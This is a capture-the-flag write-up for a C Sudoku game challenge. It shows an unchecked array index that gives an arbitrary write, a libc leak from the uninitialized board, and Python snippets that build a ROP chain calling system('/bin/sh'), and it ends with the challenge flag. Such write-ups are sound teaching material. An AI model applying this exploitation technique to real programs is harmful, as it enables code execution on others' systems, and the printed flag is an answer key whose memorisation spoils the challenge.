# sudopwn

## Write-up

- [Source code](../src/sudopwn.c)

- This is basically a Sudoku console game

- The `fill_board` function does not check bounds for the row and column indexes :

```c
void fill_board(Board board[N][N]) {
  int row, col, val;

  row = read_num("Row index: ");
  col = read_num("Column index: ");
  val = read_num("Value: ");

  board[row][col] = val;
}
```

- This allows us to write any int value to any place in memory

- We can opt for writing a ROP chain on `main`'s return address that triggers `system("/bin/sh")` to get a shell

- But first we need a libc leak : since the board is not initialized we can print it and leak some useful pointers along the way

- With some parsing effort, we can reconstitute the stack layout of the Sudoku board :

```python
# uninitialized board leaks some address pointers
board = show()

# convert board to stack addresses
a = [ c_uint(num).value for num in sum(board, [])[:-1] ]
stack = [ (a[i+1] << 4*8) | a[i] for i in range(0, len(a), 2) ]
```

- After dynamically analyzing the stack in GDB, we find a libc address at index 14 starting from the Sudoku board on the stack

- After leaking a libc address, the goal is to use the arbitrary write to write the ROP chain starting from the return address of `main`, so we need to convert our ROP chain to board values :

```python
payload = [
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    ret, # needed for stack alignment
    libc.sym.system,
]

# convert payload to board values
a = [ c_int(val).value for val in sum([ [val & 0xffffffff, val >> 4*8] for val in payload ], []) ]

# write rop chain
for i, val in enumerate(a):
    fill(9, i + 5, val)
```

- Finally we trigger our ROP chain by exiting the game (option 5)

- Full automated exploit with pwntools [here](solve.py)

## Flag

`shellmates{th3_WH0lE_4ddre$s_sP4c3_Is_4_sUD0kU_b0aRD!!!}`
